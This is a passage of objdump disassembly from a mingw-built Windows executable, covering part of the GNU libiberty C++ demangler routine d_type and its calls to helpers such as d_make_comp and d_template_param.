   1400030eb:	49 89 c0             	mov    %rax,%r8
   1400030ee:	e8 0d ec ff ff       	call   140001d00 <d_make_comp>
   1400030f3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400030f8:	48 89 c7             	mov    %rax,%rdi
   1400030fb:	e9 70 ff ff ff       	jmp    140003070 <d_type+0x1e0>
   140003100:	49 8d 40 01          	lea    0x1(%r8),%rax
   140003104:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140003108:	41 80 78 01 00       	cmpb   $0x0,0x1(%r8)
   14000310d:	0f 84 bd fe ff ff    	je     140002fd0 <d_type+0x140>
   140003113:	49 8d 40 02          	lea    0x2(%r8),%rax
   140003117:	48 89 43 18          	mov    %rax,0x18(%rbx)
   14000311b:	41 0f b6 40 01       	movzbl 0x1(%r8),%eax
   140003120:	83 e8 46             	sub    $0x46,%eax
   140003123:	3c 30                	cmp    $0x30,%al
   140003125:	0f 87 a5 fe ff ff    	ja     140002fd0 <d_type+0x140>
   14000312b:	48 8d 15 12 e4 34 00 	lea    0x34e412(%rip),%rdx        # 140351544 <.rdata+0x144>
   140003132:	0f b6 c0             	movzbl %al,%eax
   140003135:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
   140003139:	48 01 d0             	add    %rdx,%rax
   14000313c:	ff e0                	jmp    *%rax
   14000313e:	66 90                	xchg   %ax,%ax
   140003140:	48 89 d9             	mov    %rbx,%rcx
   140003143:	e8 e8 09 00 00       	call   140003b30 <d_function_type>
   140003148:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000314d:	48 89 c7             	mov    %rax,%rdi
   140003150:	e9 1b ff ff ff       	jmp    140003070 <d_type+0x1e0>
   140003155:	0f 1f 00             	nopl   (%rax)
   140003158:	49 83 c0 01          	add    $0x1,%r8
   14000315c:	48 89 d9             	mov    %rbx,%rcx
   14000315f:	4c 89 43 18          	mov    %r8,0x18(%rbx)
   140003163:	e8 28 fd ff ff       	call   140002e90 <d_type>
   140003168:	45 31 c9             	xor    %r9d,%r9d
   14000316b:	ba 27 00 00 00       	mov    $0x27,%edx
   140003170:	48 89 d9             	mov    %rbx,%rcx
   140003173:	49 89 c0             	mov    %rax,%r8
   140003176:	e8 85 eb ff ff       	call   140001d00 <d_make_comp>
   14000317b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003180:	48 89 c7             	mov    %rax,%rdi
   140003183:	e9 e8 fe ff ff       	jmp    140003070 <d_type+0x1e0>
   140003188:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000318f:	00 
   140003190:	49 83 c0 01          	add    $0x1,%r8
   140003194:	48 89 d9             	mov    %rbx,%rcx
   140003197:	4c 89 43 18          	mov    %r8,0x18(%rbx)
   14000319b:	e8 f0 fc ff ff       	call   140002e90 <d_type>
   1400031a0:	45 31 c9             	xor    %r9d,%r9d
   1400031a3:	ba 25 00 00 00       	mov    $0x25,%edx
   1400031a8:	48 89 d9             	mov    %rbx,%rcx
   1400031ab:	49 89 c0             	mov    %rax,%r8
   1400031ae:	e8 4d eb ff ff       	call   140001d00 <d_make_comp>
   1400031b3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400031b8:	48 89 c7             	mov    %rax,%rdi
   1400031bb:	e9 b0 fe ff ff       	jmp    140003070 <d_type+0x1e0>
   1400031c0:	49 83 c0 01          	add    $0x1,%r8
   1400031c4:	48 89 d9             	mov    %rbx,%rcx
   1400031c7:	4c 89 43 18          	mov    %r8,0x18(%rbx)
   1400031cb:	e8 c0 fc ff ff       	call   140002e90 <d_type>
   1400031d0:	45 31 c9             	xor    %r9d,%r9d
   1400031d3:	ba 23 00 00 00       	mov    $0x23,%edx
   1400031d8:	48 89 d9             	mov    %rbx,%rcx
   1400031db:	49 89 c0             	mov    %rax,%r8
   1400031de:	e8 1d eb ff ff       	call   140001d00 <d_make_comp>
   1400031e3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400031e8:	48 89 c7             	mov    %rax,%rdi
   1400031eb:	e9 80 fe ff ff       	jmp    140003070 <d_type+0x1e0>
   1400031f0:	49 83 c0 01          	add    $0x1,%r8
   1400031f4:	48 89 d9             	mov    %rbx,%rcx
   1400031f7:	4c 89 43 18          	mov    %r8,0x18(%rbx)
   1400031fb:	e8 90 fc ff ff       	call   140002e90 <d_type>
   140003200:	45 31 c9             	xor    %r9d,%r9d
   140003203:	ba 24 00 00 00       	mov    $0x24,%edx
   140003208:	48 89 d9             	mov    %rbx,%rcx
   14000320b:	49 89 c0             	mov    %rax,%r8
   14000320e:	e8 ed ea ff ff       	call   140001d00 <d_make_comp>
   140003213:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003218:	48 89 c7             	mov    %rax,%rdi
   14000321b:	e9 50 fe ff ff       	jmp    140003070 <d_type+0x1e0>
   140003220:	48 89 d9             	mov    %rbx,%rcx
   140003223:	e8 28 f4 ff ff       	call   140002650 <d_template_param>
   140003228:	48 8b 6b 18          	mov    0x18(%rbx),%rbp
   14000322c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003231:	48 89 c7             	mov    %rax,%rdi
   140003234:	80 7d 00 49          	cmpb   $0x49,0x0(%rbp)
   140003238:	0f 85 32 fe ff ff    	jne    140003070 <d_type+0x1e0>
   14000323e:	44 8b 4b 50          	mov    0x50(%rbx),%r9d
   140003242:	45 85 c9             	test   %r9d,%r9d
   140003245:	0f 85 4d 06 00 00    	jne    140003898 <d_type+0xa08>
   14000324b:	48 85 c0             	test   %rax,%rax
   14000324e:	0f 84 7c fd ff ff    	je     140002fd0 <d_type+0x140>
   140003254:	8b 43 38             	mov    0x38(%rbx),%eax
   140003257:	3b 43 3c             	cmp    0x3c(%rbx),%eax
   14000325a:	0f 8d 70 fd ff ff    	jge    140002fd0 <d_type+0x140>
   140003260:	48 8b 53 30          	mov    0x30(%rbx),%rdx
   140003264:	48 63 c8             	movslq %eax,%rcx
   140003267:	83 c0 01             	add    $0x1,%eax
   14000326a:	45 31 c9             	xor    %r9d,%r9d
   14000326d:	48 89 3c ca          	mov    %rdi,(%rdx,%rcx,8)
   140003271:	89 43 38             	mov    %eax,0x38(%rbx)
   140003274:	0f b6 45 00          	movzbl 0x0(%rbp),%eax
   140003278:	8d 50 b7             	lea    -0x49(%rax),%edx
   14000327b:	80 fa 01             	cmp    $0x1,%dl
   14000327e:	77 13                	ja     140003293 <d_type+0x403>
   140003280:	48 83 c5 01          	add    $0x1,%rbp
   140003284:	48 89 d9             	mov    %rbx,%rcx
   140003287:	48 89 6b 18          	mov    %rbp,0x18(%rbx)
   14000328b:	e8 60 15 00 00       	call   1400047f0 <d_template_args_1>
   140003290:	49 89 c1             	mov    %rax,%r9
   140003293:	49 89 f8             	mov    %rdi,%r8
   140003296:	ba 04 00 00 00       	mov    $0x4,%edx
   14000329b:	48 89 d9             	mov    %rbx,%rcx
   14000329e:	e8 5d ea ff ff       	call   140001d00 <d_make_comp>
   1400032a3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400032a8:	48 89 c7             	mov    %rax,%rdi
   1400032ab:	e9 c0 fd ff ff       	jmp    140003070 <d_type+0x1e0>
   1400032b0:	49 8d 50 01          	lea    0x1(%r8),%rdx
   1400032b4:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   1400032b8:	41 0f b6 40 01       	movzbl 0x1(%r8),%eax
   1400032bd:	3c 5f                	cmp    $0x5f,%al
   1400032bf:	0f 84 73 05 00 00    	je     140003838 <d_type+0x9a8>
   1400032c5:	83 e8 30             	sub    $0x30,%eax
   1400032c8:	3c 09                	cmp    $0x9,%al
   1400032ca:	0f 87 9a 05 00 00    	ja     14000386a <d_type+0x9da>
   1400032d0:	49 89 d2             	mov    %rdx,%r10
   1400032d3:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400032da:	00 00 00 00 
   1400032de:	66 90                	xchg   %ax,%ax
   1400032e0:	4d 89 d3             	mov    %r10,%r11
   1400032e3:	49 83 c2 01          	add    $0x1,%r10
   1400032e7:	4c 89 53 18          	mov    %r10,0x18(%rbx)
   1400032eb:	41 0f b6 02          	movzbl (%r10),%eax
   1400032ef:	83 e8 30             	sub    $0x30,%eax
   1400032f2:	3c 09                	cmp    $0x9,%al
   1400032f4:	76 ea                	jbe    1400032e0 <d_type+0x450>
   1400032f6:	44 89 d8             	mov    %r11d,%eax
   1400032f9:	48 89 d9             	mov    %rbx,%rcx
   1400032fc:	44 29 c0             	sub    %r8d,%eax
   1400032ff:	41 89 c0             	mov    %eax,%r8d
   140003302:	e8 f9 ea ff ff       	call   140001e00 <d_make_name>
   140003307:	48 89 c7             	mov    %rax,%rdi
   14000330a:	48 85 c0             	test   %rax,%rax
   14000330d:	0f 84 bd fc ff ff    	je     140002fd0 <d_type+0x140>
   140003313:	41 0f b6 43 01       	movzbl 0x1(%r11),%eax
   140003318:	4c 89 d2             	mov    %r10,%rdx
   14000331b:	3c 5f                	cmp    $0x5f,%al
   14000331d:	0f 85 ad fc ff ff    	jne    140002fd0 <d_type+0x140>
   140003323:	48 83 c2 01          	add    $0x1,%rdx
   140003327:	48 89 d9             	mov    %rbx,%rcx
   14000332a:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   14000332e:	e8 5d fb ff ff       	call   140002e90 <d_type>
   140003333:	49 89 f8             	mov    %rdi,%r8
   140003336:	ba 2b 00 00 00       	mov    $0x2b,%edx
   14000333b:	48 89 d9             	mov    %rbx,%rcx
   14000333e:	49 89 c1             	mov    %rax,%r9
   140003341:	e8 ba e9 ff ff       	call   140001d00 <d_make_comp>
   140003346:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000334b:	48 89 c7             	mov    %rax,%rdi
   14000334e:	e9 1d fd ff ff       	jmp    140003070 <d_type+0x1e0>
   140003353:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003358:	49 83 c0 01          	add    $0x1,%r8
   14000335c:	48 89 d9             	mov    %rbx,%rcx
   14000335f:	4c 89 43 18          	mov    %r8,0x18(%rbx)
   140003363:	e8 28 fb ff ff       	call   140002e90 <d_type>
   140003368:	48 89 c7             	mov    %rax,%rdi
   14000336b:	48 85 c0             	test   %rax,%rax
   14000336e:	0f 84 5c fc ff ff    	je     140002fd0 <d_type+0x140>
   140003374:	48 89 d9             	mov    %rbx,%rcx
   140003377:	e8 14 fb ff ff       	call   140002e90 <d_type>
   14000337c:	49 89 c1             	mov    %rax,%r9
   14000337f:	48 85 c0             	test   %rax,%rax
   140003382:	0f 84 48 fc ff ff    	je     140002fd0 <d_type+0x140>
   140003388:	49 89 f8             	mov    %rdi,%r8
   14000338b:	ba 2c 00 00 00       	mov    $0x2c,%edx
   140003390:	48 89 d9             	mov    %rbx,%rcx
   140003393:	e8 68 e9 ff ff       	call   140001d00 <d_make_comp>
   140003398:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000339d:	48 89 c7             	mov    %rax,%rdi
   1400033a0:	e9 cb fc ff ff       	jmp    140003070 <d_type+0x1e0>
   1400033a5:	48 89 d9             	mov    %rbx,%rcx
   1400033a8:	e8 b3 ea ff ff       	call   140001e60 <d_number>
   1400033ad:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   1400033b1:	41 89 c1             	mov    %eax,%r9d
   1400033b4:	0f b6 2a             	movzbl (%rdx),%ebp
   1400033b7:	40 80 fd 62          	cmp    $0x62,%bpl
   1400033bb:	0f 84 6a 05 00 00    	je     14000392b <d_type+0xa9b>
   1400033c1:	40 80 fd 78          	cmp    $0x78,%bpl
   1400033c5:	74 0c                	je     1400033d3 <d_type+0x543>
   1400033c7:	40 80 fd 5f          	cmp    $0x5f,%bpl
   1400033cb:	0f 85 ff fb ff ff    	jne    140002fd0 <d_type+0x140>
   1400033d1:	31 ed                	xor    %ebp,%ebp
   1400033d3:	8b 43 28             	mov    0x28(%rbx),%eax
   1400033d6:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   1400033d9:	0f 8d a2 05 00 00    	jge    140003981 <d_type+0xaf1>
   1400033df:	48 63 f8             	movslq %eax,%rdi
   1400033e2:	31 c9                	xor    %ecx,%ecx
   1400033e4:	83 c0 01             	add    $0x1,%eax
   1400033e7:	48 c1 e7 05          	shl    $0x5,%rdi
   1400033eb:	48 03 7b 20          	add    0x20(%rbx),%rdi
   1400033ef:	48 89 4f 04          	mov    %rcx,0x4(%rdi)
   1400033f3:	89 43 28             	mov    %eax,0x28(%rbx)
   1400033f6:	48 8d 05 23 fb 34 00 	lea    0x34fb23(%rip),%rax        # 140352f20 <cplus_demangle_builtin_types+0x440>
   1400033fd:	c7 07 5f 00 00 00    	movl   $0x5f,(%rdi)
   140003403:	48 89 47 10          	mov    %rax,0x10(%rdi)
   140003407:	66 44 89 4f 18       	mov    %r9w,0x18(%rdi)
   14000340c:	40 88 6f 1a          	mov    %bpl,0x1a(%rdi)
   140003410:	48 83 c2 01          	add    $0x1,%rdx
   140003414:	4c 8d 64 24 2c       	lea    0x2c(%rsp),%r12
   140003419:	4c 8d 05 9c e0 34 00 	lea    0x34e09c(%rip),%r8        # 1403514bc <.rdata+0xbc>
   140003420:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140003424:	4c 89 e1             	mov    %r12,%rcx
   140003427:	ba 0c 00 00 00       	mov    $0xc,%edx
   14000342c:	e8 3f c9 00 00       	call   14000fd70 <__mingw_snprintf>
   140003431:	85 c0                	test   %eax,%eax
   140003433:	78 10                	js     140003445 <d_type+0x5b5>
   140003435:	48 98                	cltq
   140003437:	48 83 c0 01          	add    $0x1,%rax
   14000343b:	48 83 f8 0c          	cmp    $0xc,%rax
   14000343f:	0f 87 43 05 00 00    	ja     140003988 <d_type+0xaf8>
   140003445:	4c 89 e1             	mov    %r12,%rcx
   140003448:	e8 d3 26 01 00       	call   140015b20 <strlen>
   14000344d:	48 8b 4f 10          	mov    0x10(%rdi),%rcx
   140003451:	48 89 c2             	mov    %rax,%rdx
   140003454:	31 c0                	xor    %eax,%eax
   140003456:	40 84 ed             	test   %bpl,%bpl
   140003459:	0f 95 c0             	setne  %al
   14000345c:	03 43 48             	add    0x48(%rbx),%eax
   14000345f:	03 41 08             	add    0x8(%rcx),%eax
   140003462:	01 d0                	add    %edx,%eax
   140003464:	89 43 48             	mov    %eax,0x48(%rbx)
   140003467:	e9 66 fb ff ff       	jmp    140002fd2 <d_type+0x142>
   14000346c:	8b 43 28             	mov    0x28(%rbx),%eax
   14000346f:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   140003472:	0f 8d 58 fb ff ff    	jge    140002fd0 <d_type+0x140>
   140003478:	48 63 f8             	movslq %eax,%rdi
   14000347b:	83 c0 01             	add    $0x1,%eax
   14000347e:	89 43 28             	mov    %eax,0x28(%rbx)
   140003481:	48 c1 e7 05          	shl    $0x5,%rdi
   140003485:	48 8d 05 58 e0 34 00 	lea    0x34e058(%rip),%rax        # 1403514e4 <.rdata+0xe4>
   14000348c:	48 03 7b 20          	add    0x20(%rbx),%rdi
   140003490:	48 c7 47 04 00 00 00 	movq   $0x0,0x4(%rdi)
   140003497:	00 
   140003498:	c7 07 00 00 00 00    	movl   $0x0,(%rdi)
   14000349e:	48 89 47 10          	mov    %rax,0x10(%rdi)
   1400034a2:	c7 47 18 0e 00 00 00 	movl   $0xe,0x18(%rdi)
   1400034a9:	e9 24 fb ff ff       	jmp    140002fd2 <d_type+0x142>
   1400034ae:	8b 43 28             	mov    0x28(%rbx),%eax
   1400034b1:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   1400034b4:	0f 8d 16 fb ff ff    	jge    140002fd0 <d_type+0x140>
   1400034ba:	48 63 f8             	movslq %eax,%rdi
   1400034bd:	83 c0 01             	add    $0x1,%eax
   1400034c0:	89 43 28             	mov    %eax,0x28(%rbx)
   1400034c3:	48 c1 e7 05          	shl    $0x5,%rdi
   1400034c7:	48 8d 05 11 e0 34 00 	lea    0x34e011(%rip),%rax        # 1403514df <.rdata+0xdf>
   1400034ce:	48 03 7b 20          	add    0x20(%rbx),%rdi
   1400034d2:	48 c7 47 04 00 00 00 	movq   $0x0,0x4(%rdi)
   1400034d9:	00 
   1400034da:	c7 07 00 00 00 00    	movl   $0x0,(%rdi)
   1400034e0:	48 89 47 10          	mov    %rax,0x10(%rdi)
   1400034e4:	c7 47 18 04 00 00 00 	movl   $0x4,0x18(%rdi)
   1400034eb:	e9 e2 fa ff ff       	jmp    140002fd2 <d_type+0x142>
   1400034f0:	8b 43 28             	mov    0x28(%rbx),%eax
   1400034f3:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   1400034f6:	0f 8d 24 5a 02 00    	jge    140028f20 <d_type.cold>
   1400034fc:	48 63 f8             	movslq %eax,%rdi
   1400034ff:	83 c0 01             	add    $0x1,%eax
   140003502:	48 c1 e7 05          	shl    $0x5,%rdi
   140003506:	48 03 7b 20          	add    0x20(%rbx),%rdi
   14000350a:	48 c7 47 04 00 00 00 	movq   $0x0,0x4(%rdi)
   140003511:	00 
   140003512:	89 43 28             	mov    %eax,0x28(%rbx)
   140003515:	48 8d 05 64 f9 34 00 	lea    0x34f964(%rip),%rax        # 140352e80 <cplus_demangle_builtin_types+0x3a0>
   14000351c:	c7 07 28 00 00 00    	movl   $0x28,(%rdi)
   140003522:	48 89 47 10          	mov    %rax,0x10(%rdi)
   140003526:	83 43 48 04          	addl   $0x4,0x48(%rbx)
   14000352a:	e9 a3 fa ff ff       	jmp    140002fd2 <d_type+0x142>
   14000352f:	8b 43 28             	mov    0x28(%rbx),%eax
   140003532:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   140003535:	0f 8d e5 59 02 00    	jge    140028f20 <d_type.cold>
   14000353b:	48 63 f8             	movslq %eax,%rdi
   14000353e:	83 c0 01             	add    $0x1,%eax
   140003541:	48 c1 e7 05          	shl    $0x5,%rdi
   140003545:	48 03 7b 20          	add    0x20(%rbx),%rdi
   140003549:	48 c7 47 04 00 00 00 	movq   $0x0,0x4(%rdi)
   140003550:	00 
   140003551:	89 43 28             	mov    %eax,0x28(%rbx)
   140003554:	48 8d 05 c5 f8 34 00 	lea    0x34f8c5(%rip),%rax        # 140352e20 <cplus_demangle_builtin_types+0x340>
   14000355b:	c7 07 28 00 00 00    	movl   $0x28,(%rdi)
   140003561:	48 89 47 10          	mov    %rax,0x10(%rdi)
   140003565:	83 43 48 09          	addl   $0x9,0x48(%rbx)
   140003569:	e9 64 fa ff ff       	jmp    140002fd2 <d_type+0x142>
   14000356e:	41 80 78 02 5f       	cmpb   $0x5f,0x2(%r8)
   140003573:	0f 84 84 03 00 00    	je     1400038fd <d_type+0xa6d>
   140003579:	8b 43 28             	mov    0x28(%rbx),%eax
   14000357c:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   14000357f:	0f 8d 4b fa ff ff    	jge    140002fd0 <d_type+0x140>
   140003585:	48 63 f8             	movslq %eax,%rdi
   140003588:	83 c0 01             	add    $0x1,%eax
   14000358b:	48 89 d9             	mov    %rbx,%rcx
   14000358e:	48 c1 e7 05          	shl    $0x5,%rdi
   140003592:	48 03 7b 20          	add    0x20(%rbx),%rdi
   140003596:	48 c7 47 04 00 00 00 	movq   $0x0,0x4(%rdi)
   14000359d:	00 
   14000359e:	89 43 28             	mov    %eax,0x28(%rbx)
   1400035a1:	c7 07 44 00 00 00    	movl   $0x44,(%rdi)
   1400035a7:	e8 b4 e8 ff ff       	call   140001e60 <d_number>
   1400035ac:	89 47 10             	mov    %eax,0x10(%rdi)
   1400035af:	48 8b 43 18          	mov    0x18(%rbx),%rax
   1400035b3:	80 38 5f             	cmpb   $0x5f,(%rax)
   1400035b6:	0f 85 14 fa ff ff    	jne    140002fd0 <d_type+0x140>
   1400035bc:	48 83 c0 01          	add    $0x1,%rax
   1400035c0:	48 89 d9             	mov    %rbx,%rcx
   1400035c3:	48 89 43 18          	mov    %rax,0x18(%rbx)
   1400035c7:	e8 c4 f8 ff ff       	call   140002e90 <d_type>
   1400035cc:	49 89 f8             	mov    %rdi,%r8
   1400035cf:	ba 2e 00 00 00       	mov    $0x2e,%edx
   1400035d4:	48 89 d9             	mov    %rbx,%rcx
   1400035d7:	49 89 c1             	mov    %rax,%r9
   1400035da:	e8 21 e7 ff ff       	call   140001d00 <d_make_comp>
   1400035df:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400035e4:	48 89 c7             	mov    %rax,%rdi
   1400035e7:	e9 84 fa ff ff       	jmp    140003070 <d_type+0x1e0>
   1400035ec:	8b 43 28             	mov    0x28(%rbx),%eax
   1400035ef:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   1400035f2:	0f 8d 28 59 02 00    	jge    140028f20 <d_type.cold>
   1400035f8:	48 63 f8             	movslq %eax,%rdi
   1400035fb:	83 c0 01             	add    $0x1,%eax
   1400035fe:	48 c1 e7 05          	shl    $0x5,%rdi
   140003602:	48 03 7b 20          	add    0x20(%rbx),%rdi
   140003606:	48 c7 47 04 00 00 00 	movq   $0x0,0x4(%rdi)
   14000360d:	00 
   14000360e:	89 43 28             	mov    %eax,0x28(%rbx)
   140003611:	48 8d 05 88 f8 34 00 	lea    0x34f888(%rip),%rax        # 140352ea0 <cplus_demangle_builtin_types+0x3c0>
   140003618:	c7 07 28 00 00 00    	movl   $0x28,(%rdi)
   14000361e:	48 89 47 10          	mov    %rax,0x10(%rdi)
   140003622:	83 43 48 07          	addl   $0x7,0x48(%rbx)
   140003626:	e9 a7 f9 ff ff       	jmp    140002fd2 <d_type+0x142>
   14000362b:	8b 43 28             	mov    0x28(%rbx),%eax
   14000362e:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   140003631:	0f 8d e9 58 02 00    	jge    140028f20 <d_type.cold>
   140003637:	48 63 f8             	movslq %eax,%rdi
   14000363a:	83 c0 01             	add    $0x1,%eax
   14000363d:	48 c1 e7 05          	shl    $0x5,%rdi
   140003641:	48 03 7b 20          	add    0x20(%rbx),%rdi
   140003645:	48 c7 47 04 00 00 00 	movq   $0x0,0x4(%rdi)
   14000364c:	00 
   14000364d:	89 43 28             	mov    %eax,0x28(%rbx)
   140003650:	48 8d 05 69 f8 34 00 	lea    0x34f869(%rip),%rax        # 140352ec0 <cplus_demangle_builtin_types+0x3e0>
   140003657:	c7 07 28 00 00 00    	movl   $0x28,(%rdi)
   14000365d:	48 89 47 10          	mov    %rax,0x10(%rdi)
   140003661:	83 43 48 08          	addl   $0x8,0x48(%rbx)
   140003665:	e9 68 f9 ff ff       	jmp    140002fd2 <d_type+0x142>
   14000366a:	48 89 d9             	mov    %rbx,%rcx
   14000366d:	e8 1e f8 ff ff       	call   140002e90 <d_type>
   140003672:	45 31 c9             	xor    %r9d,%r9d
   140003675:	ba 4d 00 00 00       	mov    $0x4d,%edx
   14000367a:	48 89 d9             	mov    %rbx,%rcx
   14000367d:	49 89 c0             	mov    %rax,%r8
   140003680:	e8 7b e6 ff ff       	call   140001d00 <d_make_comp>
   140003685:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000368a:	48 89 c7             	mov    %rax,%rdi
   14000368d:	e9 de f9 ff ff       	jmp    140003070 <d_type+0x1e0>
   140003692:	8b 43 28             	mov    0x28(%rbx),%eax
   140003695:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   140003698:	0f 8d 82 58 02 00    	jge    140028f20 <d_type.cold>
   14000369e:	48 63 f8             	movslq %eax,%rdi
   1400036a1:	83 c0 01             	add    $0x1,%eax
   1400036a4:	48 c1 e7 05          	shl    $0x5,%rdi
   1400036a8:	48 03 7b 20          	add    0x20(%rbx),%rdi
   1400036ac:	48 c7 47 04 00 00 00 	movq   $0x0,0x4(%rdi)
   1400036b3:	00 
   1400036b4:	89 43 28             	mov    %eax,0x28(%rbx)
   1400036b7:	48 8d 05 42 f8 34 00 	lea    0x34f842(%rip),%rax        # 140352f00 <cplus_demangle_builtin_types+0x420>
   1400036be:	c7 07 28 00 00 00    	movl   $0x28,(%rdi)
   1400036c4:	48 89 47 10          	mov    %rax,0x10(%rdi)
   1400036c8:	83 43 48 11          	addl   $0x11,0x48(%rbx)
   1400036cc:	e9 01 f9 ff ff       	jmp    140002fd2 <d_type+0x142>
   1400036d1:	8b 43 28             	mov    0x28(%rbx),%eax
   1400036d4:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   1400036d7:	0f 8d 43 58 02 00    	jge    140028f20 <d_type.cold>
   1400036dd:	48 63 f8             	movslq %eax,%rdi
   1400036e0:	83 c0 01             	add    $0x1,%eax
   1400036e3:	48 c1 e7 05          	shl    $0x5,%rdi
   1400036e7:	48 03 7b 20          	add    0x20(%rbx),%rdi
   1400036eb:	48 c7 47 04 00 00 00 	movq   $0x0,0x4(%rdi)
   1400036f2:	00 
   1400036f3:	89 43 28             	mov    %eax,0x28(%rbx)
   1400036f6:	48 8d 05 e3 f7 34 00 	lea    0x34f7e3(%rip),%rax        # 140352ee0 <cplus_demangle_builtin_types+0x400>
   1400036fd:	c7 07 28 00 00 00    	movl   $0x28,(%rdi)
   140003703:	48 89 47 10          	mov    %rax,0x10(%rdi)
   140003707:	83 43 48 08          	addl   $0x8,0x48(%rbx)
   14000370b:	e9 c2 f8 ff ff       	jmp    140002fd2 <d_type+0x142>
   140003710:	8b 43 28             	mov    0x28(%rbx),%eax
   140003713:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   140003716:	0f 8d 04 58 02 00    	jge    140028f20 <d_type.cold>
   14000371c:	48 63 f8             	movslq %eax,%rdi
   14000371f:	83 c0 01             	add    $0x1,%eax
   140003722:	48 c1 e7 05          	shl    $0x5,%rdi
   140003726:	48 03 7b 20          	add    0x20(%rbx),%rdi
   14000372a:	48 c7 47 04 00 00 00 	movq   $0x0,0x4(%rdi)
   140003731:	00 
   140003732:	89 43 28             	mov    %eax,0x28(%rbx)
   140003735:	48 8d 05 24 f7 34 00 	lea    0x34f724(%rip),%rax        # 140352e60 <cplus_demangle_builtin_types+0x380>
   14000373c:	c7 07 28 00 00 00    	movl   $0x28,(%rdi)
   140003742:	48 89 47 10          	mov    %rax,0x10(%rdi)
   140003746:	83 43 48 0a          	addl   $0xa,0x48(%rbx)
   14000374a:	e9 83 f8 ff ff       	jmp    140002fd2 <d_type+0x142>
   14000374f:	8b 43 28             	mov    0x28(%rbx),%eax
   140003752:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   140003755:	0f 8d c5 57 02 00    	jge    140028f20 <d_type.cold>
   14000375b:	48 63 f8             	movslq %eax,%rdi
   14000375e:	83 c0 01             	add    $0x1,%eax
   140003761:	48 c1 e7 05          	shl    $0x5,%rdi
   140003765:	48 03 7b 20          	add    0x20(%rbx),%rdi
   140003769:	48 c7 47 04 00 00 00 	movq   $0x0,0x4(%rdi)
   140003770:	00 
   140003771:	89 43 28             	mov    %eax,0x28(%rbx)
   140003774:	48 8d 05 c5 f6 34 00 	lea    0x34f6c5(%rip),%rax        # 140352e40 <cplus_demangle_builtin_types+0x360>
   14000377b:	c7 07 28 00 00 00    	movl   $0x28,(%rdi)
   140003781:	48 89 47 10          	mov    %rax,0x10(%rdi)
   140003785:	83 43 48 09          	addl   $0x9,0x48(%rbx)
   140003789:	e9 44 f8 ff ff       	jmp    140002fd2 <d_type+0x142>
   14000378e:	66 90                	xchg   %ax,%ax
   140003790:	49 83 c0 01          	add    $0x1,%r8
   140003794:	48 89 d9             	mov    %rbx,%rcx
   140003797:	4c 89 43 18          	mov    %r8,0x18(%rbx)
   14000379b:	e8 00 f3 ff ff       	call   140002aa0 <d_source_name>
   1400037a0:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400037a5:	48 89 c7             	mov    %rax,%rdi
   1400037a8:	48 8b 43 18          	mov    0x18(%rbx),%rax
   1400037ac:	80 38 49             	cmpb   $0x49,(%rax)
   1400037af:	0f 84 8a 00 00 00    	je     14000383f <d_type+0x9af>
   1400037b5:	48 89 d9             	mov    %rbx,%rcx
   1400037b8:	e8 d3 f6 ff ff       	call   140002e90 <d_type>
   1400037bd:	49 89 f9             	mov    %rdi,%r9
   1400037c0:	ba 22 00 00 00       	mov    $0x22,%edx
   1400037c5:	48 89 d9             	mov    %rbx,%rcx
   1400037c8:	49 89 c0             	mov    %rax,%r8
   1400037cb:	e8 30 e5 ff ff       	call   140001d00 <d_make_comp>
   1400037d0:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400037d5:	48 89 c7             	mov    %rax,%rdi
   1400037d8:	e9 93 f8 ff ff       	jmp    140003070 <d_type+0x1e0>
   1400037dd:	0f 1f 00             	nopl   (%rax)
   1400037e0:	83 e8 61             	sub    $0x61,%eax
   1400037e3:	48 8d 15 f6 f2 34 00 	lea    0x34f2f6(%rip),%rdx        # 140352ae0 <cplus_demangle_builtin_types>
   1400037ea:	48 98                	cltq
   1400037ec:	48 c1 e0 05          	shl    $0x5,%rax
   1400037f0:	48 01 d0             	add    %rdx,%rax
   1400037f3:	8b 53 28             	mov    0x28(%rbx),%edx
   1400037f6:	3b 53 2c             	cmp    0x2c(%rbx),%edx
   1400037f9:	0f 8d 21 57 02 00    	jge    140028f20 <d_type.cold>
   1400037ff:	48 63 fa             	movslq %edx,%rdi
   140003802:	49 83 c0 01          	add    $0x1,%r8
   140003806:	83 c2 01             	add    $0x1,%edx
   140003809:	48 c1 e7 05          	shl    $0x5,%rdi
   14000380d:	48 03 7b 20          	add    0x20(%rbx),%rdi
   140003811:	48 c7 47 04 00 00 00 	movq   $0x0,0x4(%rdi)
   140003818:	00 
   140003819:	89 53 28             	mov    %edx,0x28(%rbx)
   14000381c:	48 89 47 10          	mov    %rax,0x10(%rdi)
   140003820:	8b 40 08             	mov    0x8(%rax),%eax
